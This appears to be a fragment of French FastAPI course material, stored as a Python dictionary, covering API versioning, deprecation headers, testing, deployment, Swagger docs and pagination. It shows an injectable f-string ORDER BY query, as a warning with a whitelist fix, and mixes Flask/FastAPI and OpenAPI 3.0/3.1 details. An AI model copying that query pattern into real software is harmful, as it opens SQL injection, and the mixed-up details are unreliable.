            "  (Si les 3 essais échouent par Timeout ---> Votre API répond 504 Gateway Timeout)"
        ),
        "reference_table": {
            "title": "Matrice de Gestion des Pannes lors d'un Appel HTTP vers un Partenaire Externe",
            "headers": ["Situation Rencontrée en Aval (Partenaire)", "Exception Python (`urllib`)", "Faut-il Réessayer (`Retry`) ?", "Code HTTP Renvoyé par Votre API"],
            "rows": [
                ["Partenaire répond `200 OK` avec JSON valide", "Aucune", "Non (Succès immédiat)", "`200 OK`"],
                ["Partenaire ne répond pas dans le délai `timeout`", "`TimeoutError` / `socket.timeout`", "Oui (2 à 3 fois max avec Backoff)", "`504 Gateway Timeout` (ou `200` dégradé avec cache)"],
                ["Partenaire répond `500`, `502` ou `503`", "`HTTPError` (`e.code >= 500`)", "Oui (Erreur transitoire serveur)", "`502 Bad Gateway`"],
                ["Partenaire répond `400`, `401`, `403` ou `404`", "`HTTPError` (`400 <= e.code < 500`)", "Non (Échec déterministe immédiat)", "`502 Bad Gateway` (ou code métier approprié)"],
                ["Partenaire renvoie du HTML au lieu de JSON", "`json.JSONDecodeError`", "Non", "`502 Bad Gateway`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Appeler `urlopen(url)` ou `requests.get(url)` sans l'argument `timeout=...` à l'intérieur d'une route Flask",
                "good": "Toujours imposer un `timeout` court (ex: `timeout=2.5`) sur tout appel réseau sortant",
                "why": "Sans `timeout`, la lenteur d'un partenaire externe bloque tous les workers de votre serveur FastAPI et provoque une panne en cascade (*Cascading Failure*)."
            },
            {
                "bad": "Faire un `Retry` automatique sur une opération de paiement (`POST`) sans clé d'idempotence",
                "good": "Ne réessayer automatiquement que les requêtes idempotentes (`GET`, `PUT`, `DELETE`) ou munies d'une `Idempotency-Key`",
                "why": "Si la 1re requête avait abouti mais que seule la réponse s'est perdue sur le réseau, réessayer un `POST` non idempotent exécute l'opération deux fois."
            }
        ],
        "practical_exercises": [
            "Ajoutez un **cache de secours en mémoire (`FALLBACK_CACHE`)** à la fonction `appeler_api_externe()` : chaque fois qu'un appel réussit, sauvegardez la réponse en mémoire ; si le partenaire tombe en panne plus tard, renvoyez la dernière valeur connue avec un champ `\"mode_degrade\": True` au lieu d'une erreur `502`.",
            "Implémentez un disjoncteur simple (**Circuit Breaker**) : si 5 appels consécutifs vers le partenaire échouent, ouvrez le circuit pendant 30 secondes pour échouer instantanément sans même attendre les 2 secondes de `timeout`."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.2 : ARCHITECTURE MODULAIRE, APIROUTER & CYCLE DE VIE API (/api/v1 vs /api/v2)
    # =========================================================================
    "d5-l2": {
        "context": (
            "Deux questions fondamentales se posent dès qu'une API dépasse le stade du prototype :\n"
            "1. **Comment organiser 150 routes en Python sans transformer `app.py` en un fichier illisible de 6 000 lignes** sujet "
            "aux conflits Git et aux erreurs d'importations circulaires (`ImportError: cannot import name 'app'`) ?\n"
            "2. **Pourquoi voit-on presque toujours `/api/v1/...` dans les APIs mondiales (OpenAI `/v1/`, Stripe `/v1/`, Kubernetes `/v1`) "
            "et si rarement `/api/v2/...` ?** Et si `v2` est si rare, pourquoi est-il pourtant obligatoire de préfixer ses routes par `/api/v1` "
            "dès le premier jour ?\n"
            "Ce chapitre répond en profondeur à ces deux questions d'architecture industrielle à travers les **`APIRouter` FastAPI**, "
            "l'**Application Factory (`create_app`)**, la distinction entre **Évolution Rétrocompatible (*Non-Breaking*)** et **Rupture de Contrat (*Breaking Change*)**, "
            "ainsi que le protocole officiel de dépréciation **IETF RFC 8594 (`Deprecation` & `Sunset`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Pourquoi voit-on presque toujours `/api/v1` et rarement `/api/v2` ? (Loi de Postel & *Tolerant Reader*)",
                "body": (
                    "Dans l'industrie, une API bien conçue reste sur **`/api/v1` pendant 5 à 10 ans** parce que **90 % des évolutions fonctionnelles "
                    "sont additives et rétrocompatibles (*Non-Breaking Changes*)** :\n"
                    "- **Ce qui NE casse PAS les clients existants (On reste en `/api/v1`)** :\n"
                    "  1. **Ajouter un nouveau champ** dans la réponse JSON (ex: ajouter `\"certifiant\": true` à un objet formation) : selon le patron "
                    "*Tolerant Reader* (Loi de Postel), une application mobile ou React qui lit `data.intitule` ignore simplement les nouvelles clés JSON qu'elle ne connaît pas.\n"
                    "  2. **Ajouter une nouvelle route** (ex: `GET /api/v1/certificats`).\n"
                    "  3. **Ajouter un paramètre de requête optionnel** avec valeur par défaut (ex: `GET /api/v1/formations?lang=fr`).\n"
                    "- **Ce qui CASSE les clients existants (*Breaking Changes* -> Obligation de créer `/api/v2`)** :\n"
                    "  1. **Supprimer ou renommer une clé JSON existante** (ex: renommer `\"intitule\"` en `\"titre\"`).\n"
                    "  2. **Changer le type de données d'un champ** (ex: en `v1`, `\"duree\": 5` est un entier ; en `v2`, `\"duree\": {\"valeur\": 5, \"unite\": \"jours\"}` "
                    "devient un dictionnaire — tout client `v1` qui faisait `formation.duree * 7` plante immédiatement avec `TypeError` !).\n"
                    "  3. **Exiger un nouveau champ obligatoire** dans le corps d'un `POST` ou `PUT` sans valeur par défaut côté serveur.\n"
                    "  4. **Modifier la structure racine de la réponse** (ex: passer d'un tableau brut `[...]` à un objet enveloppe `{\"meta\": ..., \"data\": [...]}`).\n"
                    "- **Pourquoi mettre `/api/v1` dès le Jour 1 (« L'Assurance-Vie Architecturale ») ?** Si vous lancez votre API sur `/api/formations` (sans `/v1`) "
                    "et que 50 000 téléphones iOS/Android ont cette URL compilée en dur, le jour où survient une rupture de contrat, vous êtes piégé : "
                    "vous ne pouvez pas modifier `/api/formations` sans faire planter les 50 000 téléphones. Avec `/api/v1/` présent dès l'origine, vous "
                    "déployez `/api/v2/` à côté de `/api/v1/` sans aucune interruption de service !"
                )
            },
            {
                "heading": "2. Comment faire coexister `/api/v1` et `/api/v2` dans FastAPI et déprécier `v1` (Norme RFC 8594)",
                "body": (
                    "Lorsqu'une version `/api/v2` est créée, on ne coupe **jamais** `/api/v1` brutalement : on ouvre une **période de coexistence et de transition** "
                    "(généralement 6 à 12 mois) :\n"
                    "1. **Deux `APIRouter` sur la même couche métier** : Dans FastAPI, `formations_v1_router` (`prefix=\"/api/v1/formations\"`) et `formations_v2_router` "
                    "(`prefix=\"/api/v2/formations\"`) interrogent exactement la même base SQLite/PostgreSQL mais formatent le dictionnaire JSON différemment.\n"
                    "2. **Signalement automatique de fin de vie via `dependencies=[Depends(injecter_headers_depreciation_v1)]` (RFC 8594)** : Chaque réponse de `/api/v1` inclut "
                    "trois en-têtes HTTP standards inspectés par les outils de supervision et les passerelles d'API :\n"
                    "   - `Deprecation: true` : Signale officiellement que cette version de l'API est en fin de vie.\n"
                    "   - `Sunset: Thu, 31 Dec 2026 23:59:59 GMT` : Indique la date et l'heure exactes d'extinction définitive.\n"
                    "   - `Link: </api/v2/formations>; rel=\"successor-version\"` : Indique l'URL de la nouvelle version.\n"
                    "3. **Extinction finale (`410 Gone`)** : Une fois la date `Sunset` dépassée et le trafic `v1` tombé à 0 % dans les logs Nginx, "
                    "`/api/v1` renvoie le code HTTP **`410 Gone`** (Ressource définitivement retirée) avec un message pointant vers `/api/v2`."
                )
            },
            {
                "heading": "3. Découpage modulaire (`APIRouter`), *Application Factory* (`create_app`) & Sondes (`Liveness`/`Readiness`)",
                "body": (
                    "Au-delà du versioning, l'industrialisation d'une application FastAPI repose sur trois piliers :\n"
                    "- **Les `APIRouter` par domaine** : Chaque module (`web_router`, `formations_v1_router`, `formations_v2_router`, `sante_router`) encapsule ses routes, "
                    "ses tags OpenAPI et ses dépendances `Depends(...)` sans dépendre d'une variable `app` globale.\n"
                    "- **L'Application Factory (`def create_app() -> FastAPI:`)** : Instancie `FastAPI()` et appelle `app.include_router(...)`. "
                    "Supprime tout risque d'importation circulaire et permet à `pytest` ou `uvicorn \"app:create_app\" --factory` de créer des instances à la demande.\n"
                    "- **Les Sondes de Santé (*Healthchecks*)** :\n"
                    "  - `GET /api/health/live` (*Liveness Probe*) : Vérifie uniquement que le processus ASGI répond (`200 OK`).\n"
                    "  - `GET /api/health/ready` (*Readiness Probe*) : Vérifie que la base de données SQL répond (`200 OK` ou `503 Service Unavailable`)."
                )
            }
        ],
        "architecture_diagram": (
            "COEXISTENCE MULTI-VERSIONS (/api/v1 DÉPRÉCIÉE + /api/v2) VIA APIROUTER FASTAPI\n"
            "===============================================================================\n\n"
            "  Clients Historiques (App Mobile v1)            Nouveaux Clients (Portail Web / App v2)\n"
            "  GET /api/v1/formations                         GET /api/v2/formations\n"
            "            |                                              |\n"
            "            v                                              v\n"
            "  +--------------------------------------------------------------------------+\n"
            "  | APPLICATION FACTORY : create_app() -> FastAPI()                          |\n"
            "  |                                                                          |\n"
            "  |  [APIRouter formations_v1_router]            [APIRouter formations_v2]   |\n"
            "  |  prefix='/api/v1/formations'                 prefix='/api/v2/formations' |\n"
            "  |  + Headers RFC 8594 (Depends) :              + Enveloppe normalisée :     |\n"
            "  |    Deprecation: true                          {\"meta\": {...},            |\n"
            "  |    Sunset: Thu, 31 Dec 2026...                 \"data\": [{\"duree\": {      |\n"
            "  |  + Schéma plat : {\"duree\": 5}                    \"valeur\": 5, ...}}]}    |\n"
            "  +--------------------------------------------------------------------------+\n"
            "                                    \\          /\n"
            "                                     v        v\n"
            "                      [ Couche Métier & Base SQLite Unique ]"
        ),
        "reference_table": {
            "title": "Comparatif des 4 Stratégies de Versionnement d'API & Gestion des Changements",
            "headers": ["Stratégie / Mécanisme", "Exemple Concret", "Avantages Majeurs", "Usage Industriel"],
            "rows": [
                ["1. Versioning dans l'URI (*Path Versioning*)", "`GET /api/v1/formations` vs `/api/v2/formations`", "Immédiatement visible (logs Nginx, navigateur, `curl`), routage Reverse Proxy trivial", "80 % des APIs REST publiques (OpenAI, Twilio, PayPal, Kubernetes)"],
                ["2. Versioning par En-tête HTTP (*Header*)", "`X-API-Version: 2026-11-01` ou `Stripe-Version`", "URL permanente et immuable, permet un versionnement fin par date", "APIs financières et plateformes (Stripe, GitHub API)"],
                ["3. Négociation MIME (*Accept Header*)", "`Accept: application/vnd.isgp.v2+json`", "Respecte strictement la théorie REST pure (Content Negotiation)", "Systèmes hypermédias stricts"],
                ["4. En-têtes de Dépréciation (RFC 8594)", "`Deprecation: true` + `Sunset: <Date HTTP>`", "Permet aux clients de planifier leur migration de `v1` vers `v2` sans coupure brutale", "Toute API en phase de transition `v1 -> v2`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Créer `/api/v2`, `/api/v3`, `/api/v4` chaque fois qu'on ajoute un simple champ optionnel ou une nouvelle route",
                "good": "Rester sur `/api/v1` pour tous les ajouts rétrocompatibles (*Additive Changes*) et réserver `/api/v2` aux vraies ruptures de contrat (*Breaking Changes*)",
                "why": "Multiplier les versions majeures fragmente la maintenance serveur. Grâce à la Loi de Postel, `v1` peut évoluer par ajouts pendant des années."
            },
            {
                "bad": "Renommer une clé JSON (`intitule` -> `titre`) ou changer son type (`5` -> `{'valeur': 5}`) directement dans `/api/v1`",
                "good": "Conserver l'ancien format sur `/api/v1` (avec les en-têtes `Deprecation` et `Sunset`) et publier la rupture de schéma sur `/api/v2`",
                "why": "Modifier le contrat de `v1` en place provoque le crash immédiat des applications mobiles et scripts clients déjà déployés."
            },
            {
                "bad": "Renvoyer une liste JSON brute `[ {...}, {...} ]` à la racine d'une route de collection",
                "good": "Toujours encapsuler les collections dans un objet JSON `{\"meta\": {\"total\": 2}, \"data\": [ ... ]}` dès la `v1`",
                "why": "Avec un objet racine `{...}`, vous pourrez ajouter plus tard la pagination (`meta.next_cursor`) sans casser la `v1`. Avec une liste brute `[...]`, ajouter des métadonnées oblige à casser la racine et à créer une `v2` !"
            }
        ],
        "practical_exercises": [
            "Dans le Sandbox HTTP ou avec `curl -i http://127.0.0.1:5000/api/v1/sandbox/formations`, inspectez les en-têtes HTTP de dépréciation (`Deprecation`, `Sunset`, `Link`), puis appelez `/api/v2/sandbox/formations` pour comparer la transformation du champ `duree`.",
            "Ajoutez un décorateur ou middleware qui lit l'en-tête `Accept-Version: v2` ou `X-API-Version: 2.0` et aiguille automatiquement le format de sortie."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.3 : TESTS AUTOMATISÉS (TESTCLIENT), OPENAPI 3.1 & DÉPLOIEMENT ASGI (UVICORN / GUNICORN)
    # =========================================================================
    "d5-l3": {
        "context": (
            "Comment une équipe d'ingénieurs peut-elle déployer une mise à jour de son API le jeudi après-midi "
            "avec la certitude absolue qu'elle n'a cassé aucune des 120 routes existantes ?\n"
            "Tester manuellement chaque route avec `curl` ou Postman après chaque modification de code devient "
            "humainement impossible dès la deuxième semaine d'un projet. Par ailleurs, comment déployer FastAPI "
            "en haute disponibilité sur plusieurs cœurs CPU derrière un proxy inverse HTTPS ?\n"
            "Ce chapitre réunit les trois piliers de l'industrialisation : **Tests automatisés (`TestClient(app)`)**, "
            "**Spécification OpenAPI 3.1 native** et **Architecture de déploiement ASGI (`Nginx + Uvicorn / Gunicorn`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Tests d'intégration automatisés ultra-rapides avec `TestClient(app)` (`fastapi.testclient`)",
                "body": (
                    "FastAPI intègre nativement un client de test ASGI simulé en mémoire vive (propulsé par `httpx`) accessible via **`client = TestClient(app)`** :\n"
                    "- **Zéro serveur réseau à démarrer** : `client.get(\"/api/formations\")` ou `client.post(\"/api/formations\", json={...}, headers={...})` "
                    "construit une requête ASGI complète en mémoire RAM, traverse tous vos middlewares, dépendances `Depends` et routes, "
                    "et retourne l'objet `response` en moins d'une milliseconde.\n"
                    "- **Les 3 assertions indispensables d'un test d'API** :\n"
                    "  1. Vérifier le **code de statut HTTP** : `assert resp.status_code == 201`.\n"
                    "  2. Vérifier les **en-têtes HTTP** : `assert \"application/json\" in resp.headers[\"content-type\"]`.\n"
                    "  3. Vérifier la **structure et les valeurs du corps JSON** : `data = resp.json(); assert data[\"id\"] > 0`.\n"
                    "- **Règle d'or de qualité logicielle** : Pour chaque route, écrivez au minimum un test du **cas nominal (*Happy Path*)** "
                    "et des tests pour les **cas d'erreur (*Unhappy Paths* : `400`, `401`, `403`, `404`, `422`)**."
                )
            },
            {
                "heading": "2. Le contrat universel `OpenAPI 3.1` généré automatiquement sur `/openapi.json`",
                "body": (
                    "Une API sans documentation à jour est une API inutilisable. Dans FastAPI, la **spécification OpenAPI 3.1 (OAS)** "
                    "est générée **100 % automatiquement** à partir de votre code :\n"
                    "- Exposé nativement sur `GET /openapi.json` (`app.openapi()`), ce contrat décrit "
                    "de manière lisible à la fois par l'humain et par la machine :\n"
                    "  - Les métadonnées de l'API (`title`, `version`, `description`).\n"
                    "  - La liste exhaustive des chemins (`paths`), paramètres `Query`/`Path` et schémas JSON issus de vos modèles `BaseModel` Pydantic.\n"
                    "  - Les schémas de sécurité (`HTTPBearer`, `APIKeyHeader`)."
                )
            },
            {
                "heading": "3. Pourquoi `uvicorn --reload` est réservé au développement : L'architecture `Nginx -> Uvicorn / Gunicorn (ASGI) -> FastAPI`",
                "body": (
                    "Le mode `uvicorn app:app --reload` est conçu uniquement pour le confort du développeur sur son poste : "
                    "il surveille les fichiers sur disque et n'utilise qu'un seul processus.\n"
                    "En production sur Linux (VM, Docker ou Cloud), une API Python/FastAPI se déploie selon une architecture à **3 étages** :\n"
                    "1. **Étage 1 — Le Proxy Inverse (`Nginx`, `Caddy`, `Traefik` ou Load Balancer Cloud)** : Placé en première ligne sur les ports "
                    "`80` et `443`, il gère le chiffrement **HTTPS/TLS**, sert les fichiers `/static/` directement via le noyau Linux (`sendfile on`) "
                    "et répartit la charge vers les workers Uvicorn.\n"
                    "2. **Étage 2 — Le Serveur d'Application ASGI (`Uvicorn` multi-workers ou `Gunicorn` avec `UvicornWorker`)** : Démarre plusieurs "
                    "**processus travailleurs ASGI (*Workers*)** en parallèle (`uvicorn app:app --workers 4 --proxy-headers` ou `gunicorn -w 4 -k uvicorn.workers.UvicornWorker`).\n"
                    "3. **Étage 3 — Votre Application FastAPI (`create_app()`)** : S'exécute de manière asynchrone à l'intérieur de chaque worker via le protocole "
                    "standard **ASGI (*Asynchronous Server Gateway Interface*)**."
                )
            }
        ],
        "architecture_diagram": (
            "ARCHITECTURE DE DÉPLOIEMENT DE PRODUCTION LINUX (NGINX + UVICORN ASGI + FASTAPI)\n"
            "================================================================================\n\n"
            "  Internet (HTTPS :443)\n"
            "        |\n"
            "        v\n"
            "  +-------------------------------------------------------------------+\n"
            "  | 1. NGINX (Reverse Proxy)                                          |\n"
            "  |    - Terminaison SSL/TLS (Certificats HTTPS)                      |\n"
            "  |    - Fichiers /static/ (sendfile on) + Compression Gzip           |\n"
            "  +-------------------------------------------------------------------+\n"
            "        |  (Proxy Pass HTTP interne : upstream isgp_fastapi_cluster)\n"
            "        v\n"
            "  +-------------------------------------------------------------------+\n"
            "  | 2. UVICORN / GUNICORN (Serveur ASGI Multi-Workers)                |\n"
            "  |    Commande : uvicorn app:app --workers 4 --port 8000             |\n"
            "  +-------------------------------------------------------------------+\n"
            "     |                  |                  |                  |\n"
            "     v                  v                  v                  v\n"
            "  [Worker ASGI 1]    [Worker ASGI 2]    [Worker ASGI 3]    [Worker ASGI 4]\n"
            "  Instance FastAPI   Instance FastAPI   Instance FastAPI   Instance FastAPI\n"
            "     \\                  |                  |                  /\n"
            "      +-----------------+------------------+-----------------+\n"
            "                                   |\n"
            "                                   v\n"
            "                    [ Base de Données SQL / Redis ]"
        ),
        "reference_table": {
            "title": "Comparatif : Serveur de Développement (`--reload`) vs Serveur ASGI Production (`Uvicorn Workers + Nginx`)",
            "headers": ["Critère d'Exploitation", "Serveur de Dev (`uvicorn --reload`)", "Serveur ASGI Production (`Uvicorn / Gunicorn + Nginx`)"],
            "rows": [
                ["Vocation", "Développement local et rechargement à chaud", "Production haute disponibilité exposée aux utilisateurs réels"],
                ["Parallélisme multi-cœurs", "Non (1 seul processus Python)", "Oui (`N` processus Workers ASGI indépendants répartis sur tous les cœurs CPU)"],
                ["Boucle d'événements", "1 boucle `asyncio` + surveillance fichiers", "Boucles `uvloop` haute performance sans surveillance disque"],
                ["Sécurité HTTPS & Fichiers statiques", "Faible (Non conçu pour l'exposition directe sur Internet)", "Maximale (Déléguée à Nginx en frontal + `--proxy-headers` sur Uvicorn)"],
                ["Tests automatisés", "Manuels", "Exécutés automatiquement en CI/CD via `TestClient(app)`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Utiliser `--reload` sur un serveur de production",
                "good": "Toujours désactiver `--reload` en production et utiliser `--workers 4 --proxy-headers` derrière Nginx",
                "why": "Le mode `--reload` consomme du CPU/RAM pour surveiller le système de fichiers et ne peut pas être combiné avec `--workers`."
            },
            {
                "bad": "N'écrire des tests automatisés que pour les cas de succès (`200 OK`)",
                "good": "Tester systématiquement les cas d'erreur (`400`, `401`, `403`, `404`, `422`) avec `TestClient(app)`",
                "why": "Les régressions de sécurité et les crashs en production surviennent presque toujours sur les entrées invalides ou non autorisées."
            }
        ],
        "practical_exercises": [
            "Enrichissez la fonction `executer_suite_de_tests()` pour ajouter un test automatisé qui vérifie qu'un appel `POST /api/v1/formations` avec un `tarif_dzd` négatif est bien rejeté avec un code `422`.",
            "Inspectez la sortie de `client.get('/openapi.json').json()` générée automatiquement par FastAPI."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.4 : DOCUMENTATION INTERACTIVE SWAGGER UI (/DOCS), REDOC (/REDOC) & OPENAPI 3.1
    # =========================================================================
    "d5-l4": {
        "context": (
            "Dans une entreprise où l'équipe Backend Python développe une API consommée par une équipe Mobile (iOS/Android), "
            "une équipe Frontend (React/Vue) et des partenaires externes, comment communiquer la liste des URLs, les types "
            "de chaque champ JSON et les jetons requis ?\n"
            "Si vous rédigez un document Word ou un fichier PDF, **il devient obsolète dès la semaine suivante** dès qu'un "
            "développeur ajoute ou modifie un champ dans `app.py`.\n"
            "C'est ici que **FastAPI** brille particulièrement : sans écrire une seule ligne de JSON OpenAPI à la main, "
            "FastAPI génère **automatiquement et en temps réel** le contrat `/openapi.json` ainsi que deux portails Web interactifs : "
            "**Swagger UI (`/docs`)** et **ReDoc (`/redoc`)** !"
        ),
        "deep_sections": [
            {
                "heading": "1. Histoire et distinction exacte : `OpenAPI Specification (OAS)` vs `Swagger UI` & `ReDoc`",
                "body": (
                    "En entretien comme en réunion d'architecture, il est essentiel de connaître la distinction exacte entre ces termes :\n"
                    "- **`OpenAPI 3.1` (`/openapi.json`)** désigne la **grammaire standard** du fichier de contrat JSON généré par FastAPI à partir de vos modèles Pydantic.\n"
                    "- **`Swagger UI` (`/docs`)** est le portail Web interactif inclus nativement dans FastAPI offrant les boutons *« Try it out »* et *« Authorize »*.\n"
                    "- **`ReDoc` (`/redoc`)** est le second portail documentaire inclus nativement dans FastAPI, organisé en trois colonnes lisibles pour les partenaires externes."
                )
            },
            {
                "heading": "2. Comment FastAPI génère `paths`, `components.schemas` et `securitySchemes` à partir de votre code Python",
                "body": (
                    "Chaque annotation Python que vous écrivez dans FastAPI enrichit directement `/openapi.json` :\n"
                    "1. **`FastAPI(title=..., version=..., openapi_tags=...)`** : Remplit la section `info` et regroupe vos routes par catégories.\n"
                    "2. **`@app.post(..., response_model=FormationOut, summary=..., responses={...})`** : Documente l'opération, ses codes de retour et son schéma de sortie.\n"
                    "3. **Modèles Pydantic `BaseModel` + `Field(..., examples=[...])`** : Génèrent automatiquement `components.schemas` et pré-remplissent les exemples JSON dans *« Try it out »*.\n"
                    "4. **`HTTPBearer` & `APIKeyHeader`** : Activent automatiquement le bouton cadenas vert **« Authorize »** en haut à droite de `/docs` !"
                )
            },
            {
                "heading": "3. Personnaliser ou désactiver `/docs` selon l'environnement",
                "body": (
                    "FastAPI permet de personnaliser les URLs de documentation directement dans le constructeur :\n"
                    "- `app = FastAPI(docs_url=\"/docs\", redoc_url=\"/redoc\", openapi_url=\"/openapi.json\")`\n"
                    "- Si vous souhaitez exposer également `/api/docs` et `/api/openapi.json` (pour la rétrocompatibilité avec un proxy existant), "
                    "vous pouvez utiliser `get_swagger_ui_html(openapi_url=\"/openapi.json\", title=...)` de `fastapi.openapi.docs`."
                )
            }
        ],
        "architecture_diagram": (
            "ÉCOSYSTÈME OPENAPI 3.0 : UN SEUL CONTRAT POUR TOUS LES OUTILS\n"
            "=============================================================\n\n"
            "                    +-------------------------------------+\n"
            "                    |   Serveur Flask (/api/openapi.json) |\n"
            "                    |   Contrat OpenAPI 3.0.3 (JSON/YAML) |\n"
            "                    +------------------+------------------+\n"
            "                                       |\n"
            "         +-----------------------------+-----------------------------+\n"
            "         |                             |                             |\n"
            "         v                             v                             v\n"
            "  +--------------+             +---------------+             +---------------+\n"
            "  |  SWAGGER UI  |             |  POSTMAN /    |             | OPENAPI       |\n"
            "  |  (/api/docs) |             |  INSOMNIA     |             | GENERATOR     |\n"
            "  |  Portail Web |             |  Import 1-clic|             | Génère les SDK|\n"
            "  |  Interactif  |             |  Collection   |             | Mobile & Web  |\n"
            "  +--------------+             +---------------+             +---------------+"
        ),
        "reference_table": {
            "title": "Structure de Référence d'un Document OpenAPI 3.0 (`openapi.json`)",
            "headers": ["Clé Racine OpenAPI 3.0", "Rôle dans le Contrat", "Exemple de Contenu", "Impact Visuel dans Swagger UI (`/api/docs`)"],
            "rows": [
                ["`openapi` & `info`", "Version de la norme et identité de l'API", "`\"openapi\": \"3.0.3\", \"info\": {\"title\": \"...\", \"version\": \"1.0.0\"}`", "Affiche l'en-tête principal, le badge de version et la description"],
                ["`servers`", "Liste des URLs de base cibles", "`[{\"url\": \"http://127.0.0.1:5000\"}]`", "Alimente la liste déroulante *Servers* pour choisir où envoyer les requêtes"],
                ["`paths`", "Catalogue des routes et méthodes HTTP", "`\"/api/v1/formations/{id}\": {\"get\": {...}}`", "Crée les bandeaux colorés dépliables (`GET` bleu, `POST` vert, `PUT` orange, `DELETE` rouge)"],
                ["`components.schemas`", "Modèles de données JSON réutilisables (`$ref`)", "`\"Formation\": {\"type\": \"object\", \"properties\": {...}}`", "Alimente la section *Schemas* en bas de page et pré-remplit les exemples *Try it out*"],
                ["`components.securitySchemes`", "Définition des mécanismes d'authentification", "`\"BearerAuth\": {\"type\": \"http\", \"scheme\": \"bearer\"}`", "Affiche le bouton cadenas vert **« Authorize »** en haut à droite et sur chaque route protégée"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire `/api/v1/formations/<int:id>` (syntaxe Flask) à l'intérieur du fichier `openapi.json`",
                "good": "Toujours utiliser la syntaxe entre accolades `/api/v1/formations/{id}` dans la section `paths` d'OpenAPI 3.0",
                "why": "La norme OpenAPI (RFC 6570) ne reconnaît que `{id}` pour relier l'URL au paramètre `{\"name\": \"id\", \"in\": \"path\"}` dans Swagger UI."
            },
            {
                "bad": "Laisser la documentation Swagger accessible publiquement en production sur une API interne critique sans authentification si elle expose l'architecture interne",
                "good": "Protéger l'accès à `/api/docs` sur les APIs privées d'administration ou la réserver au réseau interne / portail développeur",
                "why": "Sur une API privée non destinée au public, exposer `/api/openapi.json` facilite la phase de reconnaissance d'un attaquant."
            }
        ],
        "practical_exercises": [
            "Ouvrez le portail Swagger UI intégré à ce laboratoire (`/api/docs`), cliquez sur le bouton cadenas **« Authorize »**, entrez la clé `isgp-secret-2026` dans `ApiKeyAuth`, puis testez la route `GET /api/sandbox/admin-stats` avec **« Try it out »**.",
            "Dans `day_5/05_swagger_openapi_ui.py`, ajoutez la documentation de la méthode `DELETE /api/v1/formations/{id}` sous la clé `paths[\"/api/v1/formations/{id}\"]` avec les réponses `200` et `404`."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.5 : INGÉNIERIE DE COLLECTION EN PRODUCTION (PAGINATION OFFSET VS CURSOR, FILTRAGE & TRI SÉCURISÉ)
    # =========================================================================
    "d5-l5": {
        "context": (
            "Dans un prototype pédagogique, `SELECT * FROM formations` renvoie 5 lignes en 1 milliseconde. "
            "Mais après deux ans en production, votre table `factures`, `journaux_audit` ou `inscriptions` contient "
            "**2 millions d'enregistrements**. Si un client appelle `GET /api/v1/inscriptions` et que FastAPI tente de "
            "charger et sérialiser les 2 millions de lignes d'un coup, la mémoire vive (RAM) du worker Uvicorn explose "
            "et le serveur s'effondre pour tous les utilisateurs.\n"
            "Ce chapitre de clôture 100 % FastAPI vous donne les armes d'ingénierie de données utilisées sur les APIs à fort trafic : "
            "la **Pagination par `Offset/Limit`**, la **Pagination par Curseur (`Keyset Pagination`) en temps constant $O(1)$**, "
            "le **Filtrage multi-critères (`Query(...)`)** et le **Tri dynamique protégé par liste blanche (`Whitelist`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Pagination par `Offset / Limit` (`?page=2&per_page=20`) : Fonctionnement et Limite SQL",
                "body": (
                    "La pagination classique par numéro de page repose sur deux paramètres d'URL (`page` et `per_page`) :\n"
                    "- **Calcul de l'Offset** : `offset = (page - 1) * per_page`. Pour la page 3 avec 20 éléments par page, on saute les `40` premiers "
                    "éléments (`SELECT * FROM formations ORDER BY id ASC LIMIT 20 OFFSET 40`).\n"
                    "- **Plafonnement défensif déclaratif** : Ne laissez jamais un client demander `?per_page=1000000` ! Imposez toujours un plafond "
                    "via `Query` dans FastAPI : `per_page: int = Query(20, ge=1, le=50)`.\n"
                    "- **Pourquoi `OFFSET` ralentit sur les très grandes tables** : Lorsque la base SQL exécute `LIMIT 20 OFFSET 500000`, le moteur "
                    "doit quand même lire, trier et traverser les **500 000 premières lignes** sur le disque avant de les jeter pour ne garder que les 20 suivantes."
                )
            },
            {
                "heading": "2. Pagination Haute Performance par `Curseur / Keyset` (`?after_id=1042&limit=20`)",
                "body": (
                    "Pour éliminer la lenteur d'`OFFSET` sur les flux infinis ou les tables de plusieurs millions de lignes, les grandes APIs "
                    "industrielles utilisent la **Pagination par Curseur (*Cursor / Keyset Pagination*)** :\n"
                    "- Au lieu de demander « la page 25 000 », le client indique l'identifiant (ou le timestamp) du **dernier élément qu'il a reçu** : "
                    "`GET /api/v1/catalogue/cursor?after_id=1042&limit=20`.\n"
                    "- **Requête SQL en temps constant $O(1)$** : `SELECT * FROM formations WHERE id > ? ORDER BY id ASC LIMIT ?` avec `(after_id, limit)`.\n"
                    "- Comme la colonne `id` possède un index B-Tree (clé primaire), SQLite/PostgreSQL saute **instantanément** à l'enregistrement `1043` "
                    "en moins d'une milliseconde, qu'il s'agisse du début ou de la fin d'une table de 50 millions de lignes !"
                )
            },
            {
                "heading": "3. Filtrage Multi-Critères et Tri Dynamique Sécurisé par Liste Blanche (`CHAMPS_TRI_AUTORISES`)",
                "body": (
                    "Une API professionnelle permet au client de filtrer et trier les collections (`?domaine=Securite&duree_min=4&sort=-tarif_dzd`) :\n"
                    "- **Danger d'injection SQL dans `ORDER BY`** : Les marqueurs paramétrés `?` de SQLite ne peuvent remplacer que des **valeurs** "
                    "(`WHERE domaine = ?`), ils ne peuvent pas remplacer un **nom de colonne** dans `ORDER BY`.\n"
                    "- Si un développeur écrit `f\"SELECT * FROM formations ORDER BY {request.args.get('sort')}\"`, il ouvre une **faille d'injection SQL critique** !\n"
                    "- **La règle absolue de la Liste Blanche (*Whitelist*)** : Vérifiez toujours que le nom de colonne nettoyé appartient à un ensemble "
                    "Python figé (`if cle_tri not in {\"id\", \"duree_jours\", \"tarif_dzd\", \"titre\"}: return ..., 422`) avant d'exécuter le tri."
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON SQL : PAGINATION OFFSET O(N) VS PAGINATION CURSEUR KEYSET O(1)\n"
            "==========================================================================\n\n"
            "  [A] OFFSET / LIMIT (?page=5000&per_page=20 -> OFFSET 99980) :\n"
